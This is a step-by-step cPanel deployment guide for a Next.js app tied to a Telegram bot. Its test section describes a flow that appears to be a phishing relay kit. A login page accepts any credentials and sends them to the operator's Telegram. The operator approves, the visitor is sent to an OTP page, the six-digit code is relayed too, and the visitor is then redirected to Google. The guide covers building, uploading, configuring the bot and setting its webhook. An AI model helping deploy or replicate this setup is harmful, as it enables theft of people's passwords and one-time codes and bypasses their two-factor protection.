# 🚀 Simple cPanel Deployment Steps

## Easy 5-Step Process

### Step 1: Build Your Project Locally 💻

1. **Open your project folder** in terminal/command prompt
2. **Run these commands one by one:**
   ```bash
   npm install
   npm run build
   ```
3. **Wait for build to complete** - you'll see a `.next` folder created

### Step 2: Prepare Files for Upload 📁

1. **Create a ZIP file** containing these folders/files:

   - `src/` folder
   - `public/` folder
   - `.next/` folder (created after build)
   - `package.json`
   - `package-lock.json`
   - `next.config.mjs`
   - `data/` folder
   - `scripts/` folder
   - `utils/` folder

2. **Don't include:**
   - `node_modules/` folder (too big)
   - `.git/` folder
   - Any `.md` files

### Step 3: Upload to cPanel File Manager 📤

1. **Login to your cPanel**
2. **Click "File Manager"**
3. **Go to `public_html` folder** (or your domain folder)
4. **Click "Upload"**
5. **Select your ZIP file** and upload
6. **Right-click the ZIP file** → **"Extract"**
7. **Delete the ZIP file** after extraction

### Step 4: Setup Node.js App 🔧

1. **In cPanel, find "Node.js App"**
2. **Click "Create Application"**
3. **Fill in:**
   - **Node.js Version:** 18.x or 20.x
   - **Application Mode:** Production
   - **Application Root:** `public_html` (or your domain folder)
   - **Application URL:** Leave blank or put your domain
   - **Application Startup File:** `server.js`
4. **Click "Create"**

### Step 5: Install Dependencies & Start 🚀

1. **Click on your newly created app**
2. **Go to "Package.json" tab**
3. **Click "Run NPM Install"** - wait for it to finish
4. **Go back to main app page**
5. **Click "Restart"** to start your app
6. **Check Status** - should show "Running"

## Configure Your Bot (Important!) 🤖

### Update Your Config File

1. **In File Manager, open:** `src/config/cpanel-config.js`
2. **Replace these values:**
   ```javascript
   TELEGRAM_BOT_TOKEN: "YOUR_ACTUAL_BOT_TOKEN_HERE",
   TELEGRAM_CHAT_ID: "YOUR_ACTUAL_CHAT_ID_HERE",
   APP_URL: "https://yourdomain.com",
   ```

### Get Bot Token & Chat ID

1. **Message @BotFather on Telegram:**

   - Send: `/newbot`
   - Choose name and username
   - Copy the token

2. **Message @userinfobot on Telegram:**
   - Send: `/start`
   - Copy your Chat ID

### Setup Telegram Webhook

**Open this URL in browser** (replace YOUR_BOT_TOKEN and yourdomain.com):

```
https://api.telegram.org/botYOUR_BOT_TOKEN/setWebhook?url=https://yourdomain.com/api/telegram-webhook/
```

## Test Your App ✅

1. **Visit your domain** - should show login page
2. **Enter any credentials** - should get Telegram message
3. **Click Approve in Telegram** - should go to OTP page
4. **Enter any 6-digit code** - should get another Telegram message
5. **Click Approve again** - should redirect to Google

## Common Issues & Fixes 🔧

**App won't start?**

- Check if Node.js version is 18.x or higher
- Make sure you ran `npm run build` locally first

**No Telegram messages?**

- Double-check your Bot Token and Chat ID
- Make sure webhook URL uses your actual domain
- Ensure your domain has SSL (https://)

**Build errors?**

- Delete `node_modules` and `.next` folders
- Run `npm install` then `npm run build` again locally

---

## That's It! 🎉

Your app should now be running at `https://yourdomain.com`

The admin (you) will receive Telegram messages when someone tries to login, and you can approve or reject them directly from Telegram!
